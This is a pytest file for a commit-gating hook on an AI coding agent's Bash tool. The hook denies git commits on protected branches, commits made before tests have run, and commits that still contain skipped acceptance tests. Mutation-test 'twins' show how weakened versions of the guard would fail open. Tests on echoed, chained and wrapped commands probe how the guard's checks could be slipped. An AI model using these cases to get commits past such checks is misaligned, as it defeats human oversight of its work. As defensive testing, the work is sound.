    """Twin: fail closed when the checklist is absent instead of going inert.
    The lighter profile's commit then denies, reddening exactly that inertness
    assertion."""
    mutant = _write_mutant(
        tmp_path,
        "checklist_missing_deny",
        _UNSKIP_NO_CHECKLIST,
        '    if not checklist.is_file():\n        _deny("mutant: missing checklist")',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path, staged={"story.txt": "story work"}, checklist=None
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the checklist-missing inertness assertion must red"
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_mutant_diffwise_unskip_allows_readded_marker(tmp_path: Path) -> None:
    """Twin: re-read the clause diff-wise — deny only when a marker present in
    HEAD survives into the index. The re-add is then allowed (that assertion
    reds) while the marker-absent control stays green, which is precisely the
    misreading the pair exists to catch."""
    mutant = _write_mutant(
        tmp_path,
        "diffwise",
        "        if _SKIP_TOKEN in blob:\n            still_skipped.append(rel)",
        "        head = subprocess.run(\n"
        '            ["git", "show", f"HEAD:{rel}"],\n'
        "            cwd=cwd or None, capture_output=True, text=True, timeout=10,\n"
        "        )\n"
        "        if _SKIP_TOKEN in blob and _SKIP_TOKEN in head.stdout:\n"
        "            still_skipped.append(rel)",
    )
    readd_repo, readd_impl, readd_root = _production_repo(
        tmp_path / "readd",
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    code, out = _run_mutant_hook(
        mutant,
        _commit_event(readd_repo),
        readd_repo,
        _production_env(readd_impl, readd_root),
    )
    assert code == 0, "the re-add deny assertion must red under a diff-wise reading"
    assert out is None

    control_repo, control_impl, control_root = _production_repo(
        tmp_path / "control",
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE + "// one more assertion\n"},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    code, _ = _run_mutant_hook(
        mutant,
        _commit_event(control_repo),
        control_repo,
        _production_env(control_impl, control_root),
    )
    assert code == 0, "the marker-absent control stays green: it isolates nothing alone"


def test_mutant_test_artifacts_cwd_fallback_reds_env_unset_inertness(tmp_path: Path) -> None:
    """Twin: give the test-artifacts resolver the cwd-derived fallback its
    sibling carries. The env-unset commit then resolves a root, finds the
    planted checklist, and denies — reddening both the inertness assertion and
    the source-shape one."""
    edits = [
        (_TEST_ARTIFACTS_DEF, "def _test_artifacts(cwd: str | None) -> Path | None:"),
        (
            _TEST_ARTIFACTS_TAIL,
            '    env = os.environ.get("ULTRACODE_TEST_ARTIFACTS")\n'
            "    if env:\n"
            "        return Path(env)\n"
            "    if cwd:\n"
            '        return Path(cwd) / "_bmad-output" / "test-artifacts"\n'
            "    return None",
        ),
        (_TEST_ARTIFACTS_CALL, "    tests_root = _test_artifacts(cwd)"),
    ]
    mutant = _write_mutant_multi(tmp_path, "cwd_fallback", edits)
    repo, impl, _ = _env_unset_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2, "the env-unset inertness assertion must red under a fallback"
    assert "Un-skip proof" in _reason(out)
    # ...and the source-shape assertion reds on sight of the same mutation.
    assert _resolver_derives_a_path(mutant.read_text(encoding="utf-8"))

    # The pre-existing green-story regression test plants no checklist, so under
    # this same mutation it goes inert for want of one and stays green. It is a
    # live regression witness, not a twin.
    plain_repo, plain_impl = _green_story_repo(tmp_path / "plain", stage=True)
    code, out = _run_mutant_hook(
        mutant,
        _commit_event(plain_repo),
        plain_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(plain_impl)},
    )
    assert code == 0
    assert out is None


def test_mutant_unreadable_checklist_note_allows_commit(tmp_path: Path) -> None:
    """Twin: turn the unreadable-checklist deny into the inert note. Only the
    unreadable-checklist assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "unreadable_note",
        _UNSKIP_UNREADABLE,
        "    except (OSError, UnicodeDecodeError):\n"
        '        _note("mutant: note instead of deny")\n        return\n        _deny(\n',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    (tests_root / _CHECKLIST_NAME).write_bytes(b"\xff\xfe not decodable \x00\x9c")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the unreadable-checklist deny assertion must red"
    assert out is None


def test_mutant_git_show_failure_treated_as_empty_allows_commit(tmp_path: Path) -> None:
    """Twin: read an unanswerable `git show :<path>` as an empty blob and carry
    on. Only the staged-read-failure assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "git_show_empty",
        _UNSKIP_UNREADABLE_STAGED,
        "        if not readable:\n            continue\n            _deny(\n",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=_checklist_body("tests/acceptance/missing.spec.ts"),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the staged-read-failure deny assertion must red"
    assert out is None


def test_mutant_deny_on_empty_test_file_list_reds_doc_only_commit(tmp_path: Path) -> None:
    """Twin: fail closed when the checklist enumerates no acceptance-test file.
    The doc-only story's commit then denies — which is also why that case is
    inert in the first place: every documentation and refactor commit would
    otherwise brick."""
    mutant = _write_mutant(
        tmp_path,
        "no_files_deny",
        _UNSKIP_NO_FILES,
        '    if not files:\n        _deny("mutant: checklist names no test file")',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"docs/notes.md": "prose only\n"},
        checklist="# Acceptance checklist for STORY-1\n\nNo acceptance tests: docs only.\n",
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the doc-only inertness assertion must red"
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


# --- Un-skip proof: the checklist's `generatedTestFiles` list -----------------
# TEA's ATDD lists the test files it scaffolded in the checklist frontmatter, and
# cites cases in its tables as `file::case`, often by bare file name. When that
# list names a test file it is the whole set the clause reads; the body is
# scanned only when the list is absent or names none. A list that is there but
# cannot be read as a list denies.

_LISTED_TABLE = (
    "| Test (file::case) | Primary |\n"
    "| --- | --- |\n"
    "| `login.spec.ts::logs the user in` | **yes** |\n"
)


def _listed_checklist(value: str, body: str = _LISTED_TABLE, extra: str = "") -> str:
    """A checklist in the shape TEA's ATDD writes: frontmatter whose
    `generatedTestFiles` is `value` (the text after the key, newlines kept),
    then a body citing cases by bare `file::case`."""
    return (
        "---\n"
        "stepsCompleted: ['step-04c-aggregate']\n"
        "storyKey: 'STORY-1'\n"
        f"generatedTestFiles:{value}\n"
        f"{extra}"
        "---\n\n# ATDD Checklist - STORY-1\n\n" + body
    )


_LISTED_BLOCK = f"\n  - '{_ACCEPTANCE_REL}'"


def test_unskip_listed_files_ignore_bare_file_case_references(tmp_path: Path) -> None:
    # The reported defect: every listed file is staged clean, and the body cites
    # a case by bare file name, which `git show :` cannot read.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(_LISTED_BLOCK),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "a bare file::case reference must not deny a listed, clean file"
    assert out is None

    # Control: the same body with no frontmatter is scanned whole, and the
    # bare name is exactly what the scan hands `git show :`.
    (tests_root / _CHECKLIST_NAME).write_text(f"- `{_ACCEPTANCE_REL}`\n" + _LISTED_TABLE)
    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))
    assert code == 2
    assert "git show :login.spec.ts" in _reason(out)


def test_unskip_listed_file_still_skipped_denies(tmp_path: Path) -> None:
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_listed_checklist(_LISTED_BLOCK),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason and _ACCEPTANCE_REL in reason
    assert "still contains `test.skip(`" in reason


def test_unskip_listed_file_not_staged_denies_naming_the_list(tmp_path: Path) -> None:
    missing = "tests/acceptance/missing.spec.ts"
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=_listed_checklist(f"\n  - '{missing}'"),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert f"git show :{missing}" in reason
    assert f"generatedTestFiles list of {_CHECKLIST_NAME}" in reason
    assert "Empty-index guard" not in reason


def test_unskip_listed_files_leave_input_documents_unread(tmp_path: Path) -> None:
    # A test the story only read (listed in inputDocuments, cited in the body)
    # may be skipped for reasons of its own, such as a later story's scaffold.
    other = "tests/acceptance/later-story.spec.ts"
    repo, impl, tests_root = _production_repo(
        tmp_path,
        committed={other: _SKIPPED_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(
            _LISTED_BLOCK,
            body=_LISTED_TABLE + f"\nSee also `{other}`.\n",
            extra=f"inputDocuments:\n  - '{other}'\n",
        ),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "only the listed files are the story's acceptance tests"
    assert out is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        pytest.param(f"\n  - '{_ACCEPTANCE_REL}'", [_ACCEPTANCE_REL], id="block-single-quoted"),
        pytest.param(f'\n  - "{_ACCEPTANCE_REL}"', [_ACCEPTANCE_REL], id="block-double-quoted"),
        pytest.param(f"\n  - {_ACCEPTANCE_REL}", [_ACCEPTANCE_REL], id="block-plain"),
        pytest.param(f"\n- '{_ACCEPTANCE_REL}'", [_ACCEPTANCE_REL], id="block-indentless"),
        pytest.param(
            f" # scaffolded\n  # API first\n  - '{_ACCEPTANCE_REL}' # red phase",
            [_ACCEPTANCE_REL],
            id="comments",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL}'] # one file", [_ACCEPTANCE_REL], id="flow-trailing-comment"
        ),
        pytest.param(f" ['{_ACCEPTANCE_REL}']", [_ACCEPTANCE_REL], id="flow-one-line"),
        pytest.param(
            f"\n  [\n    '{_ACCEPTANCE_REL}',\n  ]", [_ACCEPTANCE_REL], id="flow-multi-line"
        ),
        pytest.param(
            f" [\n  '{_ACCEPTANCE_REL}',\n]", [_ACCEPTANCE_REL], id="flow-closed-at-column-0"
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (AC #3)']", [_ACCEPTANCE_REL], id="flow-hash-in-note"
        ),
        pytest.param(
            f"\n  - '{_ACCEPTANCE_REL} (cases appended)'", [_ACCEPTANCE_REL], id="with-note"
        ),
        pytest.param(
            f"\n  - '{{project-root}}/{_ACCEPTANCE_REL}'",
            [f"{{project-root}}/{_ACCEPTANCE_REL}"],
            id="project-root",
        ),
        pytest.param(
            f"\n  - 'src/sync/mod.rs (#[cfg(test)] mod tests)'\n  - '{_ACCEPTANCE_REL}'",
            [_ACCEPTANCE_REL],
            id="non-js-entry-beside",
        ),
    ],
)
def test_unskip_listed_file_shapes_are_read(
    tmp_path: Path, guard_module, value: str, expected: list[str]
) -> None:
    # The reader's own result is what proves it parsed the shape: the body names
    # no path, but a reader that read nothing would fall back to scanning the
    # whole text, find the path in the frontmatter and deny all the same.
    checklist = _listed_checklist(value, body="No paths in the body.\n")
    assert guard_module._listed_test_files(checklist) == expected
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=checklist,
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert _ACCEPTANCE_REL in _reason(out)


# More listed files, for the lists whose second entry shares a line with a
# first entry whose note holds a `#`.
_SESSION_REL = "tests/acceptance/session.spec.ts"
_LOGOUT_REL = "tests/acceptance/logout.spec.ts"


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (AC #3 cases appended)', '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="flow-one-line",
        ),
        pytest.param(
            f"\n  [\n    '{_ACCEPTANCE_REL} (AC #3)', '{_SESSION_REL}',\n  ]",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="flow-multi-line",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (AC #3 cases appended)', '{_SESSION_REL}',\n"
            f"    '{_LOGOUT_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL, _LOGOUT_REL],
            id="flow-wrapped",
        ),
        pytest.param(
            f"\n- '{_ACCEPTANCE_REL} (AC\n#3)'\n- '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-quoted-over-two-lines-at-column-0",
        ),
        pytest.param(
            f"\n- {_ACCEPTANCE_REL} (AC 2, 'til done)\n# - {_LOGOUT_REL}\n- '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-plain-apostrophe-then-comment-at-column-0",
        ),
        pytest.param(
            f"\n  - &files ['{_ACCEPTANCE_REL} (AC #3)', '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="anchor-before-nested-flow",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (note ]\n#3)', '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="key-line-flow-quoted-over-two-lines-at-column-0",
        ),
    ],
)
def test_unskip_listed_entry_after_a_hash_note_denies(
    tmp_path: Path, guard_module, value: str, expected: list[str]
) -> None:
    # A `#` inside a quoted note starts no comment, on the note's own line or the
    # line it runs onto, and an apostrophe in a plain note opens no quote that
    # would keep the comment after it. So the entry after the note is still
    # listed. Here that entry is the one left skipped.
    checklist = _listed_checklist(value, body="No paths in the body.\n")
    assert guard_module._listed_test_files(checklist) == expected
    staged = {rel: _CLEAN_ACCEPTANCE for rel in expected}
    staged[_SESSION_REL] = _SKIPPED_ACCEPTANCE
    repo, impl, tests_root = _production_repo(tmp_path, staged=staged, checklist=checklist)

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert f"the staged content of {_SESSION_REL} still contains" in _reason(out)


def test_unskip_listed_hash_note_with_every_file_clean_is_allowed(
    tmp_path: Path, guard_module
) -> None:
    # The one-line list Prettier keeps for a short value is valid YAML, so it is
    # read, not denied as an unclosed `[` list.
    checklist = _listed_checklist(
        f" ['{_ACCEPTANCE_REL} (AC #3 cases appended)', '{_SESSION_REL}']",
        body="No paths in the body.\n",
    )
    assert guard_module._listed_test_files(checklist) == [_ACCEPTANCE_REL, _SESSION_REL]
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE, _SESSION_REL: _CLEAN_ACCEPTANCE},
        checklist=checklist,
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "a valid list whose files are all staged clean must not deny"
    assert out is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (the ''smoke'' cases #3)', '{_SESSION_REL}',\n"
            f"    '{_LOGOUT_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL, _LOGOUT_REL],
            id="single-quote-escaped",
        ),
        pytest.param(
            f' ["{_ACCEPTANCE_REL} (say \\" #3)", \'{_SESSION_REL}\',\n'
            f"    '{_LOGOUT_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL, _LOGOUT_REL],
            id="double-quote-escaped",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (note\n    #3)', '{_SESSION_REL}',\n    '{_LOGOUT_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL, _LOGOUT_REL],
            id="quoted-over-two-lines",
        ),
        pytest.param(
            f" [{_ACCEPTANCE_REL} (it's appended), '{_SESSION_REL} (AC #3)', '{_LOGOUT_REL}',\n"
            "  ]",
            [_ACCEPTANCE_REL, _SESSION_REL, _LOGOUT_REL],
            id="plain-apostrophe",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL}', # was {_LOGOUT_REL}\n    '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="flow-comment-between-entries",
        ),
        pytest.param(
            f"\n  - '{_ACCEPTANCE_REL}' # was {_LOGOUT_REL}\n  - '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-trailing-comment",
        ),
        pytest.param(
            f"\n- '{_ACCEPTANCE_REL} (AC\n#3)'\n- '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-quoted-over-two-lines-at-column-0",
        ),
        pytest.param(
            # What yaml.dump(width=53) writes for this list.
            f"\n- '{_ACCEPTANCE_REL} (cases appended for AC\n  #3)'\n- {_SESSION_REL}",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-quoted-over-two-lines",
        ),
        pytest.param(
            f"\n- '{_ACCEPTANCE_REL} (AC\n3)'\n- '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-quoted-over-two-lines-no-hash-at-column-0",
        ),
        pytest.param(
            f"\n- '{_ACCEPTANCE_REL} (cases appended for\n  AC 3)'\n- {_SESSION_REL}",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-quoted-over-two-lines-no-hash",
        ),
        pytest.param(
            f"\n- {_ACCEPTANCE_REL} (AC 2, 'til done)\n# - {_LOGOUT_REL}\n- '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-plain-apostrophe-then-comment-at-column-0",
        ),
        pytest.param(
            f"\n  - {_ACCEPTANCE_REL} (AC 2, 'til done)\n  # - '{_LOGOUT_REL}'\n"
            f"  - '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-plain-apostrophe-then-comment",
        ),
        pytest.param(
            f"\n  - {_ACCEPTANCE_REL} (AC 2, 'til done) # was {_LOGOUT_REL}\n"
            f"  - '{_SESSION_REL}'",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="block-plain-apostrophe-then-trailing-comment",
        ),
        pytest.param(
            f"\n  - &files ['{_ACCEPTANCE_REL} (AC #3)', '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="anchor-before-nested-flow",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL} (note ]\n#3)', '{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="key-line-flow-quoted-over-two-lines-at-column-0",
        ),
        pytest.param(
            f" ['{_ACCEPTANCE_REL}',\n'{_SESSION_REL}']",
            [_ACCEPTANCE_REL, _SESSION_REL],
            id="flow-entry-at-column-0",
        ),
    ],
)
def test_unskip_listed_reader_strips_only_comments(
    guard_module, value: str, expected: list[str]
) -> None:
    # A `#` starts a comment only after whitespace and outside a quoted scalar,
    # whatever quote escapes, line breaks or plain apostrophes come before it,
    # and a line a quoted entry or an open `[` list runs onto, even at column
    # 0, continues it. PyYAML reads each of these values as the expected entries.
    assert guard_module._listed_test_files(_listed_checklist(value)) == expected


def test_unskip_listed_reader_stops_at_the_next_key_after_a_wrapped_flow_entry(
    guard_module,
) -> None:
    # Inside a `[` list a line break is only whitespace, so the `'` that starts
    # the line a plain entry wraps onto opens no quote, and the key after the
    # list still ends it. PyYAML reads the two entries and a separate key.
    checklist = _listed_checklist(
        f" [{_ACCEPTANCE_REL} (AC\n  'til done), {_SESSION_REL}]",
        extra="inputDocuments:\n  - 'docs/prd.md'\n",
    )
    assert guard_module._listed_test_files(checklist) == [_ACCEPTANCE_REL, _SESSION_REL]


@pytest.mark.parametrize(
    ("value", "extra", "problem"),
    [
        pytest.param(f" '{_ACCEPTANCE_REL}'", "", "its value is not a list", id="scalar"),
        pytest.param(
            f"\n  [\n    '{_ACCEPTANCE_REL}',\n", "", "not closed by `]`", id="unclosed-flow"
        ),
        pytest.param(
            f"\n  - '{_ACCEPTANCE_REL}'\n  {_ACCEPTANCE_REL}", "", "not a `- ` item",
            id="stray-line",
        ),
        pytest.param(
            _LISTED_BLOCK, f"generatedTestFiles:{_LISTED_BLOCK}\n", "more than once",
            id="duplicate-key",
        ),
    ],
)
def test_unskip_malformed_listed_files_denies(
    tmp_path: Path, value: str, extra: str, problem: str
) -> None:
    # The staged blob is clean and the body names it in full, so a scan of the
    # body would allow this commit: the deny can only come from the list.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(value, body=f"`{_ACCEPTANCE_REL}`\n", extra=extra),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason and "generatedTestFiles" in reason
    assert "cannot be read" in reason and problem in reason


@pytest.mark.parametrize(
    "value",
    [
        pytest.param(" []", id="empty"),
        pytest.param("\n  - 'src/sync/mod.rs (#[cfg(test)] mod tests)'", id="no-js-test"),
    ],
)
def test_unskip_listed_files_naming_no_test_file_fall_back_to_scan(
    tmp_path: Path, guard_module, value: str
) -> None:
    # TEA starts the list as `[]`; a run that stopped before filling it, or a
    # stack whose tests are not JS, must not turn the clause off. The reader
    # reads the list as empty, not as absent.
    checklist = _listed_checklist(value, body=f"- `{_ACCEPTANCE_REL}`\n")
    assert guard_module._listed_test_files(checklist) == []
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=checklist,
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert _ACCEPTANCE_REL in _reason(out)


def test_unskip_listed_reader_returns_none_without_frontmatter_key(guard_module) -> None:
    read = guard_module._listed_test_files
    assert read(_checklist_body(_ACCEPTANCE_REL)) is None  # no frontmatter
    assert read("---\nstoryKey: 'STORY-1'\n---\n`a.spec.ts`\n") is None  # no key
    assert read(f"---\ngeneratedTestFiles:{_LISTED_BLOCK}\n") is None  # never closed
    assert read(f"---\ngeneratedTestFiles:{_LISTED_BLOCK}\n---\n") == [_ACCEPTANCE_REL]


# --- Executed mutants of the generatedTestFiles reading ----------------------

_UNSKIP_ENTRIES = "    entries = listed or _checklist_test_files(text)"
_UNSKIP_MALFORMED = "    except ValueError as problem:\n        _deny(\n"


def test_mutant_scan_only_reds_bare_reference_commit(tmp_path: Path) -> None:
    """Twin: ignore the list and scan the whole text, as 3.0.0 did. The bare
    `file::case` reference then denies the clean commit."""
    mutant = _write_mutant(
        tmp_path, "scan_only", _UNSKIP_ENTRIES, "    entries = _checklist_test_files(text)"
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(_LISTED_BLOCK),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the bare-reference allow assertion must red"
    assert "git show :login.spec.ts" in _reason(out)


def test_mutant_malformed_list_falls_back_allows_commit(tmp_path: Path) -> None:
    """Twin: read a malformed list as an absent one. The body scan then allows
    the commit, and the malformed-list deny assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "malformed_fallback",
        _UNSKIP_MALFORMED,
        "    except ValueError as problem:\n        listed = None\n        if False:\n"
        "            _deny(\n",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_listed_checklist(f" '{_ACCEPTANCE_REL}'", body=f"`{_ACCEPTANCE_REL}`\n"),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the malformed-list deny assertion must red"
    assert out is None


def test_mutant_empty_list_authoritative_allows_skipped_commit(tmp_path: Path) -> None:
    """Twin: take an empty list as the whole set instead of falling back. The
    body's skipped file is then never read and the commit is allowed."""
    mutant = _write_mutant(
        tmp_path,
        "empty_authoritative",
        _UNSKIP_ENTRIES,
        "    entries = listed if listed is not None else _checklist_test_files(text)",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_listed_checklist(" []", body=f"- `{_ACCEPTANCE_REL}`\n"),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the empty-list fallback assertion must red"
    assert out is None


# ---------------------------------------------------------------------------
# Verb anchoring: `git` must be the segment's LEADING token.
#
# A verb merely MENTIONED (an echo, a log line, a here-string in a verification
# command) is not a git write and must not burn a turn on a deny. The anchor is
# taken AFTER stripping leading `VAR=val` assignments and known exec wrappers,
# which is what keeps the fix from becoming a fail-open: an env- or
# sudo-prefixed real commit still denies.
#
# Twins in this section come in two shapes. Behavioral ones run a patched COPY
# of the hook under tmp_path (never the live file). Ones that must remove a
# clause import the shipped module in-process and monkeypatch a single constant,
# so the neutering is expressed against the real code rather than a hand-edited
# lookalike.
# ---------------------------------------------------------------------------

_ECHO_MENTION = 'echo "remember to git commit once the suite is green"'


def _load_guard_module():
    spec = importlib.util.spec_from_file_location("ucg_guard_under_test", HOOK)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def guard_module():
    """The shipped hook imported in-process, fresh per test.

    Fresh matters: monkeypatched constants must not leak between twins.
    """
    return _load_guard_module()


def _bash_event(cwd: Path, command: str) -> dict:
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "cwd": str(cwd),
    }


def _protected_repo(tmp_path: Path, name: str = "protected") -> Path:
    repo = tmp_path / name
    repo.mkdir(parents=True)
    _init_repo(repo, "main")
    return repo


def _unmarked_epic_repo(tmp_path: Path, name: str = "epic") -> tuple[Path, Path]:
    """Epic branch, story known, tests-ran marker NOT yet written.

    The turn-burning shape in practice: mid-story, a status or verification
    command that happens to name the verb.
    """
    repo = tmp_path / name
    repo.mkdir(parents=True)
    _init_repo(repo, "ultracode/epic-42")
    impl = repo / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")
    return repo, impl


def test_echo_mention_of_git_commit_is_allowed(tmp_path: Path) -> None:
    """A mentioned verb is not a write, on either gated branch shape."""
    protected = _protected_repo(tmp_path)
    code, out = _run_hook(_bash_event(protected, _ECHO_MENTION), protected)
    assert code == 0, "a mention on a protected branch is not a commit"
    assert out is None

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_hook(
        _bash_event(repo, _ECHO_MENTION), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "nor is it one before the tests-ran marker exists"
    assert out is None

    # Same anchoring, second obligation: the verb is matched as a whole token,
    # so the plumbing command the old trailing `\b` never actually excluded
    # (`-` is itself a word boundary) is no longer read as a commit.
    code, out = _run_hook(
        _bash_event(protected, "git commit-tree -p HEAD -m x abc123"), protected
    )
    assert code == 0
    assert out is None


_TOKENIZE_BODY = "    return shlex.split(segment)"


def test_anchoring_disabled_denies_echo_mention(tmp_path: Path) -> None:
    """Twin: force the classifier down its fail-closed fallback branch.

    The fallback is the legacy matches-anywhere scan, kept for segments that
    cannot be tokenized. Driving a well-formed segment into it restores the old
    behavior exactly, and the echo denies again — which is what proves the
    allow above comes from the anchoring rather than from the guard never
    looking at the command.
    """
    mutant = _write_mutant(
        tmp_path,
        "no_anchor",
        _TOKENIZE_BODY,
        '    raise ValueError("mutant: tokenizer disabled")',
    )

    protected = _protected_repo(tmp_path)
    code, out = _run_mutant_hook(mutant, _bash_event(protected, _ECHO_MENTION), protected)
    assert code == 2, "the protected-branch allow assertion must red without anchoring"
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_mutant_hook(
        mutant,
        _bash_event(repo, _ECHO_MENTION),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert code == 2, "and so must the tests-ran allow assertion"
    assert "Tests-ran guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_chained_real_commit_still_denied(tmp_path: Path) -> None:
    """A real chained commit is caught by the per-segment classification."""
    chained = "git add -A && git commit -m x"

    protected = _protected_repo(tmp_path)
    code, out = _run_hook(_bash_event(protected, chained), protected)
    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_hook(
        _bash_event(repo, chained), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2
    assert "Tests-ran guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


_SEGMENT_SPLIT = (
    "    for separators in (\n"
    '        r"&&|\\|\\||;|\\|",\n'
    '        r"&&|\\|\\||;|\\||\\n|\\r",\n'
    '        r"&&|\\|\\||;|\\||&|\\n|\\r",\n'
    "    ):\n"
    "        for segment in re.split(separators, command):\n"
    "            verbs |= _segment_write_verbs(segment, depth, scope)"
)
